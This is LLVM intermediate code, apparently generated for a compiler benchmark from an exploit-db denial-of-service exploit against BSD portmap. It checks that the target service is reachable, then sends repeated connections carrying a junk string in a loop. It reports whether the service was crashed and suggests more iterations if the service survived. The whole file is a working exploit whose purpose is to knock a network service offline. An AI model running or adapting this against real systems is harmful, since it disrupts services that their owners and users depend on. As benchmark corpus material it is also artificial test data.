; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_38059.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_38059.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [51 x i8] c"[+] This code doesn't deserve 1337 status output.\0A\00", align 1
@.str.1 = private unnamed_addr constant [38 x i8] c"[+] Trying to crash portmap on %s:%d\0A\00", align 1
@HOST = common dso_local global i8* null, align 8
@PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"[-] %s:%d is already down.\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@LOOP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"8========@\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"[+] %s:%d is now down.\0A\00", align 1
@.str.5 = private unnamed_addr constant [66 x i8] c"[-] %s:%d is still listening. Try to increase loop iterations...\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %1, align 4
  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str, i64 0, i64 0))
  %6 = load i8*, i8** @HOST, align 8
  %7 = load i32, i32* @PORT, align 4
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0), i8* %6, i32 %7)
  %9 = load i32, i32* @AF_INET, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %9, i32* %10, align 4
  %11 = load i32, i32* @PORT, align 4
  %12 = call i32 @htons(i32 %11)
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  store i32 %12, i32* %13, align 4
  %14 = load i8*, i8** @HOST, align 8
  %15 = call i32 @inet_addr(i8* %14)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %16, i32 0, i32 0
  store i32 %15, i32* %17, align 4
  %18 = load i32, i32* @AF_INET, align 4
  %19 = load i32, i32* @SOCK_STREAM, align 4
  %20 = load i32, i32* @IPPROTO_TCP, align 4
  %21 = call i32 @socket(i32 %18, i32 %19, i32 %20)
  store i32 %21, i32* %2, align 4
  %22 = load i32, i32* %2, align 4
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = call i32 @connect(i32 %22, %struct.sockaddr* %23, i32 12)
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %31

26:                                               ; preds = %0
  %27 = load i8*, i8** @HOST, align 8
  %28 = load i32, i32* @PORT, align 4
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i8* %27, i32 %28)
  %30 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %30, i32* %1, align 4
  br label %62

31:                                               ; preds = %0
  store i32 0, i32* %3, align 4
  br label %32

32:                                               ; preds = %46, %31
  %33 = load i32, i32* %3, align 4
  %34 = load i32, i32* @LOOP, align 4
  %35 = icmp slt i32 %33, %34
  br i1 %35, label %36, label %49

36:                                               ; preds = %32
  %37 = load i32, i32* @AF_INET, align 4
  %38 = load i32, i32* @SOCK_STREAM, align 4
  %39 = load i32, i32* @IPPROTO_TCP, align 4
  %40 = call i32 @socket(i32 %37, i32 %38, i32 %39)
  store i32 %40, i32* %2, align 4
  %41 = load i32, i32* %2, align 4
  %42 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 12)
  %44 = load i32, i32* %2, align 4
  %45 = call i32 @send(i32 %44, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i32 10, i32 0)
  br label %46

46:                                               ; preds = %36
  %47 = load i32, i32* %3, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %3, align 4
  br label %32

49:                                               ; preds = %32
  %50 = load i32, i32* %2, align 4
  %51 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 12)
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

54:                                               ; preds = %49
  %55 = load i8*, i8** @HOST, align 8
  %56 = load i32, i32* @PORT, align 4
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0), i8* %55, i32 %56)
  br label %60

58:                                               ; preds = %49
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.5, i64 0, i64 0))
  br label %60

60:                                               ; preds = %58, %54
  %61 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %61, i32* %1, align 4
  br label %62

62:                                               ; preds = %60, %26
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
